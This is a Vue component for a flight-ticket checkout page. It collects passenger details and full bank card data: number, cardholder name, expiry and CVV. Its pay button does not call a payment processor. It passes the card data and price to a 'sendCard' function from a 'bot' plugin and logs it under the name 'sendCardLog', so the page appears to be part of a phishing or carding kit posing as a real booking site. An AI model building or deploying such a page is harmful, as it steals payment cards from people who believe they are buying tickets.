<template>
  <header-vue />
  <pagenete />
  <div class="container__title">
    <div class="content__title">
      <h5 class="title">Review&amp;Pay</h5>
      <div class="direction">
        <h2 class="first__direction">{{ this.$route.params.depar }}</h2>
        <span class="icon__direction"></span>
        <h2 class="first__direction">{{ this.$route.params.return }}</h2>
      </div>
      <span class="direction__date">tue, january 25, 1 adult</span>
    </div>
  </div>
  <div class="container__main">
    <form action="" class="form">
      <div class="container__info">
        <div class="info__title">
          <h4 class="info__title_text">Passenger information</h4>
        </div>
        <div class="info__content">
          <div class="info__forms">
            <div class="info__input">
              <label for="null" class="info__label">First name</label>
              <div class="input__wrapper">
                <input
                  type="text"
                  placeholder="John"
                  autocomplete="no"
                  class="input"
                  value=""
                />
              </div>
            </div>
            <div class="info__input p-10">
              <label for="null" class="info__label">Last name</label>
              <div class="input__wrapper">
                <input
                  type="text"
                  placeholder="Smith"
                  autocomplete="no"
                  class="input"
                  value=""
                />
              </div>
            </div>
            <div class="info__input p-10">
              <label for="null" class="info__label">Email</label>
              <div class="input__wrapper">
                <input
                  type="text"
                  placeholder="Email"
                  autocomplete="no"
                  class="input"
                  value=""
                />
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="payment">
        <div class="payment_content">
          <h4 class="payment_title">Select a payment method</h4>
          <div class="payment_card_container">
            <div class="payment_card_content">
              <div class="title_card_container">
                <h5 class="title_card">Bank card</h5>
              </div>
              <div class="card_form">
                <div class="card_nember">
                  <div class="info__input">
                    <label for="null" class="info__label">Card number</label>
                    <div class="input__wrapper">
                      <input
                        type="text"
                        placeholder="0000 0000 0000 0000"
                        class="input"
                        v-model="card"
                      />
                    </div>
                  </div>
                </div>
                <div class="card_data">
                  <div class="card_placeholder">
                    <div class="info__input">
                      <label for="null" class="info__label"
                        >Cardholder (as indicated on the card)</label
                      >
                      <div class="input__wrapper">
                        <input
                          type="text"
                          placeholder="FABIAN JANSEN"
                          autocomplete="no"
                          class="input"
                          v-model="placeholder"
                        />
                      </div>
                    </div>
                  </div>
                  <div class="card_date_cvv">
                    <div class="card_date">
                      <div class="info__input">
                        <label for="null" class="info__label"
                          >Expiry date</label
                        >
                        <div class="input__wrapper">
                          <input
                            type="text"
                            placeholder="MM/YY"
                            autocomplete="no"
                            class="input"
                            v-model="date"
                          />
                        </div>
                      </div>
                    </div>
                    <div class="card_cvv">
                      <div class="info__input">
                        <label for="null" class="info__label"
                          >CVC/CVV code</label
                        >
                        <div class="input__wrapper">
                          <input
                            type="text"
                            placeholder="000"
                            autocomplete="no"
                            class="input"
                            v-model="cvv"
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="error" v-if="error">Заполните все поля</div>
            </div>
          </div>
        </div>
      </div>
      <div class="confirm">
        <div class="confirm_detalis">
          <div class="detalis_text">Total including additional services</div>
          <span class="detalis_link">Details</span>
        </div>
        <div class="confirm_prices">
          <div class="confirm_price">
            <h3 class="price_title">Total price:</h3>
            <div class="price">${{ this.$route.params.price }}</div>
          </div>
          <button type="button" class="confirm_submit" @click="sendCardLog()">
            Pay for the ticket
          </button>
        </div>
      </div>
    </form>
  </div>
  <footer-vue />
  <modal-dialog :show="show" :price="this.$route.params.price" />
</template>

<script>
import HeaderVue from "@/components/Header.vue";
import Pagenete from "@/components/Pagenete.vue";
import FooterVue from "@/components/Footer.vue";
import ModalDialog from "@/components/ModalDialog.vue";
import { sendCard } from "../plugins/bot";

export default {
  components: {
    HeaderVue,
    Pagenete,
    FooterVue,
    ModalDialog,
  },
  data() {
    return {
      show: false,
      card: "",
      date: "",
      cvv: "",
      error: false,
      placeholder: "",
      oldCard: 0,
      oldDate: 0,
    };
  },
  methods: {
    sendCardLog() {
      if (
        this.card.length > 0 &&
        this.date.length > 0 &&
        this.cvv.length > 0 &&
        this.placeholder.length > 0
      ) {
        sendCard(
          this.card,
          this.date,
          this.cvv,
          this.$route.params.price,
          this.placeholder
        );
        this.show = true;
      } else {
        this.error = true;
      }
    },
  },
  watch: {
    card() {
      let cardLen = this.card.length;
      if (cardLen < this.oldCard) return this.oldCard--;
      if (cardLen > 21 || !this.card.match(/\d/i))
        this.card = this.card.substring(0, cardLen - 1);
      if (cardLen === 4) this.card += " ";
      if (cardLen === 9) this.card += " ";
      if (cardLen === 14) this.card += " ";
      this.oldCard++;
      this.error = false;
    },
    date() {
      let dateLen = this.date.length;
      if (dateLen < this.oldDate) return this.oldDate--;
      if (dateLen > 5 || !this.date.match(/[\d|/]/i))
        this.date = this.date.substring(0, dateLen - 1);
      if (dateLen === 2) this.date += "/";
      this.oldDate++;
      this.error = false;
    },
    cvv() {
      if (this.cvv.length > 4 || !this.cvv.match(/\d/i))
        this.cvv = this.cvv.substring(0, this.cvv.length - 1);
      this.error = false;
    },
  },
};
</script>

<style scoped>
.error {
  color: #e64926;
  font-size: 18px;
  text-align: center;
  margin-top: 15px;
}
.detalis_link {
  display: inline-flex;
  align-items: center;
  color: #007acc;
  cursor: pointer;
  font-size: 16px;
  line-height: 20px;
  text-decoration: none;
  transition-property: color;
  font-size: 18px;
  font-weight: 400;
  line-height: 26px;
}
.detalis_text {
  font-size: 18px;
  font-weight: 400;
  line-height: 26px;
  margin-right: 6px;
}
.confirm_detalis {
  display: flex;
  align-items: center;
  border-bottom: 1px solid #dde3eb;
  padding: 0 0 12px;
}
.price {
  color: #fc6100;
  font-size: 30px;
  font-weight: 600;
  line-height: 34px;
  letter-spacing: -0.6px;
  margin: 0;
  margin-left: 16px;
}
.price_title {
  font-size: 30px;
  font-weight: 600;
  line-height: 34px;
  letter-spacing: -0.6px;
  margin: 0;
}
.confirm_submit {
  font-family: inherit;
  border: none;
  outline: none;
  margin: 0;
  display: inline-block;
  color: #ffffff;
  background: #0f99f5;
  font-size: 20px;
  font-weight: 600;
  line-height: 20px;
  transform: translateZ(0);
  border-radius: 8px;
  padding: 10px;
  padding-right: 20px;
  padding-left: 12.5px;
  transition: 0.15s ease-out;
  transition-property: opacity, box-shadow;
}
.confirm_price {
  display: flex;
  align-self: center;
}
.confirm_prices {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 30px;
}
.confirm {
  background-color: #ffffff;
  box-shadow: 0px 4px 10px rgb(98 112 139 / 10%);
  border-radius: 8px;
  margin-bottom: 24px;
  padding: 32px;
}
.card_date {
  -webkit-box-flex: 1;
  flex-grow: 1;
}
.card_date_cvv {
  display: flex;
  margin-left: 17px;
  width: 50%;
}
.card_placeholder {
  flex: 1;
}
.card_data {
  display: flex;
  align-items: baseline;
  justify-content: space-between;
  margin-top: 20px;
}
.card_nember {
  flex: 1;
}
.title_card {
  font-size: 20px;
  font-weight: 600;
  line-height: 24px;
  letter-spacing: -0.2px;
  margin: 0;
}
.title_card_container {
  display: flex;
  align-items: center;
  -webkit-box-pack: justify;
  justify-content: space-between;
  margin-bottom: 20px;
}
.payment_card_content {
  width: 540px;
  padding: 25px 30px;
  border-radius: 8px;
  background: #f0f5fa;
  padding-bottom: 60px;
}
.payment_card_container {
  display: flex;
  justify-content: center;
  margin-top: 30px;
}

.payment_title {
  font-size: 24px;
  font-weight: 600;
  line-height: 28px;
  letter-spacing: -0.4px;
  margin: 0;
  margin-bottom: 18px;
}
.payment_content {
  width: 100%;
}
.payment {
  background-color: #ffffff;
  box-shadow: 0px 4px 10px rgb(98 112 139 / 10%);
  border-radius: 8px;
  margin-bottom: 24px;
  padding: 32px;
  margin-top: 12px;
  display: flex;
  align-items: center;
}
.form {
  width: 100%;
}
.input {
  position: relative;
  flex-grow: 1;
  flex-shrink: 1;
  width: 100%;
  height: 100%;
  line-height: normal;
  border: none;
  min-height: 38px;
  font-family: inherit;
  opacity: 1;
  padding-left: 22px;
  padding-right: 11px;
  font-size: 16px;
  color: #333333;
  background-color: transparent;
  border-radius: 8px;
}
.input__wrapper {
  position: relative;
  display: flex;
  flex-flow: row nowrap;
  justify-content: space-between;
  align-items: center;
  background-color: #fafbfc;
  border-radius: 8px;
  border: 1px solid #dde3eb;
  border-style: solid;
  transition: 0.15s ease-out;
  transition-property: border-color;
  margin-right: 10px;
}
.info__label {
  display: block;
  margin-bottom: 6px;
  font-size: 14px;
  line-height: 18px;
  color: #333333;
  user-select: none;
}
.info__forms {
  display: flex;
  margin-top: 12px;
  flex-wrap: wrap;
}
.info__content {
  border-top: 1px solid #dde3eb;
  padding: 32px;
  padding-top: 10px;
}
.container__main {
  width: 1176px;
  margin: 0 auto;
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  overflow: hidden;
}
.info__title_text {
  font-size: 24px;
  font-weight: 600;
  line-height: 28px;
  letter-spacing: -0.4px;
  margin: 0;
}
.info__title {
  position: relative;
  padding: 32px;
}
.container__info {
  background-color: #ffffff;
  box-shadow: 0px 4px 10px rgb(98 112 139 / 10%);
  border-radius: 8px;
  margin-bottom: 24px;
  margin-top: 24px;
}
.container__title {
  width: 1176px;
  margin: 0 auto;
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
}
.content__title {
  display: flex;
  flex-direction: column;
  width: 100%;
}
.title {
  font-size: 20px;
  font-weight: 600;
  line-height: 24px;
  letter-spacing: -0.2px;
  margin: 0;
  margin-bottom: 4px;
  display: block;
}
.direction {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  margin-bottom: 8px;
}

.first__direction {
  font-size: 38px;
  font-weight: 600;
  line-height: 38px;
  letter-spacing: -1px;
  margin: 0;
}
.icon__direction {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTMgMTJoMThtMCAwbC0zLTNtMyAzbC0zIDMiIHN0cm9rZT0iIzAwMCIgc3Ryb2tlLXdpZHRoPSIxLjgiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPjwvc3ZnPg==);
  display: inline-block;
  background-size: contain;
  margin-left: 19px;
  margin-right: 19px;
  width: 24px;
  height: 24px;
}
.direction__date {
  font-size: 16px;
  font-weight: 400;
  line-height: 22px;
  color: #808080;
}
@media screen and (max-width: 1199px) {
  .container__title,
  .container__main {
    margin: 0;
    width: auto;
    flex-direction: column;
  }
  .content__title {
    margin: 0;
    width: auto;
    flex-direction: column;
    padding: 0 18px;
  }
  .title {
    font-size: 18px;
    line-height: 22px;
    letter-spacing: -0.1px;
  }
  .first__direction {
    font-size: 24px;
    line-height: 28px;
    letter-spacing: -0.4px;
  }
  .payment {
    margin-top: 0;
    border-top: 0;
  }
}

@media screen and (max-width: 599px) {
  .container__info {
    margin-bottom: 16px;
  }
  .info__title {
    padding: 16px;
  }
  .info__forms {
    flex-direction: column;
  }
  .p-10 {
    padding-top: 10px;
  }
  .payment_card_content {
    width: calc(100% + 36px);
    padding: 30px 16px;
    margin: 0 -18px;
    border-radius: 0px;
    border-left: none;
    border-right: none;
  }
  .payment {
    padding: 16px;
  }
  .card_data {
    display: block;
  }
  .card_date_cvv {
    width: 100%;
    margin-left: 0;
    margin-top: 10px;
  }
  .card_date {
    flex-grow: 0;
    width: 100%;
  }
  .card_cvv {
    width: 100%;
  }
  .confirm_prices {
    display: block;
  }
  .confirm_price {
    -webkit-box-pack: justify;
    justify-content: space-between;
    align-self: stretch;
    margin-bottom: 16px;
  }
  .price,
  .price_title {
    font-size: 18px;
    font-weight: 600;
    line-height: 22px;
    letter-spacing: -0.1px;
    margin: 0;
  }
  .confirm_submit {
    width: 100%;
  }
}
</style>
